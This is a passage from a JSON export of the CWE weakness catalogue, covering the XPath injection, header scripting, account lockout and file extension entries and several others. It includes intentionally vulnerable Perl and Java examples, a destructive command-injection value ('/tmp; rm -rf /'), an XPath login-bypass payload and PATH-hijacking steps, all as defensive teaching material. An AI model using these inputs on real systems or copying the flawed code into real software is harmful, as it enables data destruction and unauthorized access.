              "BodyText": "This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges."
            },
            {
              "BodyText": "However, because the program does not modify the PATH environment variable, the following attack would work:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "- The user sets the PATH to reference a directory under the attacker's control, such as \"/my/dir/\".\n\n  - The attacker creates a malicious program called \"ls\", and puts that program in /my/dir\n\n  - The user executes the program.\n\n  - When system() is executed, the shell consults the PATH to find the ls program\n\n  - The program finds the attacker's malicious program, \"/my/dir/ls\". It doesn't find \"/bin/ls\" because PATH does not contain \"/bin/\".\n\n  - The program executes the attacker's malicious program with the raised privileges."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code segment implements a basic server that uses the \"ls\" program to perform a directory listing of the directory that is listed in the \"HOMEDIR\" environment variable. The code intends to allow the user to specify an alternate \"LANG\" environment variable. This causes \"ls\" to customize its output based on a given language, which is an important capability when supporting internationalization."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$ENV{\"HOMEDIR\"} = \"/home/mydir/public/\";\n\tmy $stream = AcceptUntrustedInputStream();\n\twhile (<$stream>) {\n\t\t\tchomp;\n\t\t\tif (/^ENV ([\\w\\_]+) (.*)/) {\n\t\t\t\t$ENV{$1} = $2;\n\t\t\t}\n\t\t\telsif (/^QUIT/) { ... }\n\t\t\telsif (/^LIST/) {\n\t\t\t\topen($fh, \"/bin/ls -l $ENV{HOMEDIR}|\");\n\t\t\t\twhile (<$fh>) {\n\t\t\t\t\tSendOutput($stream, \"FILEINFO: $_\");\n\t\t\t\t}\n\t\t\t\tclose($fh);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The programmer takes care to call a specific \"ls\" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as \"ENV HOMEDIR /secret/directory\" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as \"/tmp; rm -rf /\". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be an allowlist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed."
            },
            {
              "BodyText": "While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-2428",
          "Description": "Mail client stores password hashes for unrelated accounts in a hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2428"
        },
        {
          "Reference": "CVE-2008-0306",
          "Description": "Privileged program trusts user-specified environment variable to modify critical configuration settings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0306"
        },
        {
          "Reference": "CVE-1999-0073",
          "Description": "Telnet daemon allows remote clients to specify critical environment variables for the server, leading to code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-0073"
        },
        {
          "Reference": "CVE-2007-4432",
          "Description": "Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4432"
        },
        {
          "Reference": "CVE-2006-7191",
          "Description": "Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7191"
        },
        {
          "Reference": "CVE-2008-5738",
          "Description": "Calendar application allows bypass of authentication by setting a certain cookie value to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5738"
        },
        {
          "Reference": "CVE-2008-5642",
          "Description": "Setting of a language preference in a cookie enables path traversal attack.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5642"
        },
        {
          "Reference": "CVE-2008-5125",
          "Description": "Application allows admin privileges by setting a cookie value to \"admin.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5125"
        },
        {
          "Reference": "CVE-2008-5065",
          "Description": "Application allows admin privileges by setting a cookie value to \"admin.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5065"
        },
        {
          "Reference": "CVE-2008-4752",
          "Description": "Application allows admin privileges by setting a cookie value to \"admin.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4752"
        },
        {
          "Reference": "CVE-2000-0102",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0102"
        },
        {
          "Reference": "CVE-2000-0253",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0253"
        },
        {
          "Reference": "CVE-2008-1319",
          "Description": "Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1319"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "RelatedAttackPatterns": [
        "21",
        "31"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-528",
          "Authors": [
            "OWASP"
          ],
          "Title": "Top 10 2007-Insecure Direct Object Reference",
          "PublicationYear": "2007",
          "URL": "http://www.owasp.org/index.php/Top_10_2007-A4"
        },
        {
          "ExternalReferenceID": "REF-529",
          "Title": "HMAC",
          "PublicationYear": "2011",
          "PublicationMonth": "08",
          "PublicationDay": "18",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/HMAC",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 4: Use of Magic URLs, Predictable Cookies, and Hidden Form\n                  Fields.\" Page 75",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "643",
      "Name": "Improper Neutralization of Data within XPath Expressions ('XPath Injection')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.",
      "ExtendedDescription": "The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "943",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "91",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "Controlling application flow (e.g. bypassing authentication)."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The attacker could read restricted XML content."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-211",
          "Entries": [
            {
              "IntroText": "Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:"
            },
            {
              "Nature": "Informative",
              "Language": "XML",
              "ExampleCode": "```\n\t<users>\n\t\t<user>\n\t\t\t<login>john</login>\n\t\t\t<password>abracadabra</password>\n\t\t\t<home_dir>/home/john</home_dir>\n\t\t</user>\n\t\t<user>\n\t\t\t<login>cbc</login>\n\t\t\t<password>1mgr8</password>\n\t\t\t<home_dir>/home/cbc</home_dir>\n\t\t</user>\n\t</users>\n```"
            },
            {
              "BodyText": "The Java code used to retrieve the home directory based on the provided credentials is:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tXPath xpath = XPathFactory.newInstance().newXPath();\n\tXPathExpression xlogin = xpath.compile(\"//users/user[login/text()='\" + login.getUserName() + \"' and password/text() = '\" + login.getPassword() + \"']/home_dir/text()\");\n\tDocument d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(\"db.xml\"));\n\tString homedir = xlogin.evaluate(d);\n```"
            },
            {
              "BodyText": "Assume that user \"john\" wishes to leverage XPath Injection and login without a valid password. By providing a username \"john\" and password \"' or ''='\" the XPath expression now becomes"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()\n```"
            },
            {
              "BodyText": "This lets user \"john\" login without a valid password, thus bypassing authentication."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "39",
          "EntryName": "XPath Injection"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-531",
          "Authors": [
            "Web Application Security Consortium"
          ],
          "Title": "XPath Injection",
          "URL": "http://projects.webappsec.org/w/page/13247005/XPath%20Injection",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 17, \"XPath Injection\", Page 1070",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database."
        }
      ]
    },
    {
      "ID": "644",
      "Name": "Improper Neutralization of HTTP Headers for Scripting Syntax",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.",
      "ExtendedDescription": "\n\nAn attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.\n\n\nIf a product does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "116",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "Run arbitrary code."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Attackers may be able to obtain sensitive information."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Perform output validation in order to filter/escape/encode unsafe data that is being passed from the server in an HTTP response header."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Disable script execution functionality in the clients' browser."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example, user-controlled data is added to the HTTP headers and returned to the client. Given that the data is not subject to neutralization, a malicious user may be able to inject dangerous scripting tags that will lead to script execution in the client browser."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tresponse.addHeader(HEADER_NAME, untrustedRawInputData);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-3918",
          "Description": "Web server does not remove the Expect header from an HTTP request when it is reflected back in an error message, allowing a Flash SWF file to perform XSS attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3918"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "645",
      "Name": "Overly Restrictive Account Lockout Mechanism",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.",
      "ExtendedDescription": "Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "287",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "Users could be locked out of accounts."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Implement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Implement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Consider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation)."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."
            }
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "2"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "646",
      "Name": "Reliance on File Name or Extension of Externally-Supplied File",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.",
      "ExtendedDescription": "An application might use the file name or extension of a user-supplied file to determine the proper course of action, such as selecting the correct process to which control should be passed, deciding what data should be made available, or what resources should be allocated. If the attacker can cause the code to misclassify the supplied file, then the wrong action could occur. For example, an attacker could supply a file that ends in a \".php.gif\" extension that appears to be a GIF image, but would be processed as PHP code. In extreme cases, code execution is possible, but the attacker could also cause exhaustion of resources, denial of service, exposure of debug or system data (including application source code), or being bound to a particular server side process. This weakness may be due to a vulnerability in any of the technologies used by the web and application servers, due to misconfiguration, or resultant from another flaw in the application itself.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "An attacker may be able to read sensitive data."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "An attacker may be able to cause a denial of service."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker may be able to gain privileges."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make decisions on the server side based on file content and not on file name or extension."
        }
      ],
      "RelatedAttackPatterns": [
        "209"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "647",
      "Name": "Use of Non-Canonical URL Paths for Authorization Decisions",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.",
      "ExtendedDescription": "\n\nIf an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:\n\n\n  - http://WWW.EXAMPLE.COM/mypage\n\n  - http://www.example.com/%6Dypage (alternate encoding)\n\n  - http://192.168.1.1/mypage (IP address)\n\n  - http://www.example.com/mypage/ (trailing /)\n\n  - http://www.example.com:80/mypage\n\nTherefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "An attacker may be able to bypass the authorization mechanism to gain access to the otherwise-protected URL."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Files or Directories"
          ],
          "Note": "If a non-canonical URL is used, the server may choose to return the contents of the file, instead of pre-processing the file (e.g. as a program)."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make access control policy based on path information in canonical form. Use very restrictive regular expressions to validate that the path is in the expected form."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Reject all alternate path encodings that are not in the expected canonical form."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Example from CAPEC (CAPEC ID: 4, \"Using Alternative IP Address Encodings\"). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "IDS02-J",
          "EntryName": "Canonicalize path names before validating them"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "648",
      "Name": "Incorrect Use of Privileged APIs",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.",
      "ExtendedDescription": "\n\nWhen a product contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to:\n\n\n  - ensure that assumptions made by the APIs are valid, such as validity of arguments\n\n  - account for known weaknesses in the design/implementation of the API\n\n  - call the API from a safe context\n\nIf the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data.\n\nFor instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.\n",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "269",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker may be able to elevate privileges."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "An attacker may be able to obtain sensitive information."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "An attacker may be able to execute code."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Before calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Know architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Only call privileged APIs from safe, consistent and expected state."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges)."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2003-0645",
          "Description": "A Unix utility that displays online help files, if installed setuid, could allow a local attacker to gain privileges when a particular file-opening function is called.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0645"
        }
      ],
      "RelatedAttackPatterns": [
        "107",
        "234"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "649",
      "Name": "Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the product does not use integrity checks to detect if those inputs have been modified.",
      "ExtendedDescription": "When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ],
          "Note": "The inputs could be modified without detection, causing the product to have unexpected system state or make incorrect security decisions."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Repeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Client side tokens/parameters should not be such that it would be easy/predictable to guess another valid state."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-0039",
